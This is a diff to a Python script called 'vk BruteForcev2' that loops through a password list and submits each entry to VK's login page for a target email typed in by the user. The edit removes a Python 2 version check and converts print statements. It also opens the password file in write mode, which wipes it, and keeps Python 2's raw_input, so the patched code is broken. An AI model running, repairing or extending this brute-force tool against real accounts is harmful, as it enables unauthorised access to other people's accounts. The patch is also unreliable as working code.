@@ -1,13 +1,7 @@
 import time
 import sys
 
-if sys.version_info[0] !=2: 
-	print('''===================
-	         REQUIRED PYTHON 2.x
-	         use: python fb2.py
-                 ===================
-			''')
-	sys.exit()
+
 
 post_url='https://www.vk.com/login.php'
 headers = {
@@ -25,12 +19,12 @@ except:
 	sys.exit()
 
 print('\n----------{Welcome To vk BruteForcev2}----------\n')
-file=open('passwords.txt','r')
+file=open('passwords.txt','w')
 
 email=str(raw_input('Enter Email/Username : ').strip())
 
-print "\nTarget Email ID : ",email
-print "\nTrying Passwords from list ..."
+print("\nTarget Email ID : ",email)
+print ("\nTrying Passwords from list ...")
 
 i=0
 while file:
@@ -38,7 +32,7 @@ while file:
 	i+=1
 	if len(passw) < 6:
 		continue
-	print str(i) +" : ",passw
+	print (str(i) +" : ",passw)
 	response = browser.open(post_url)
 	try:
 		if response.code == 200:
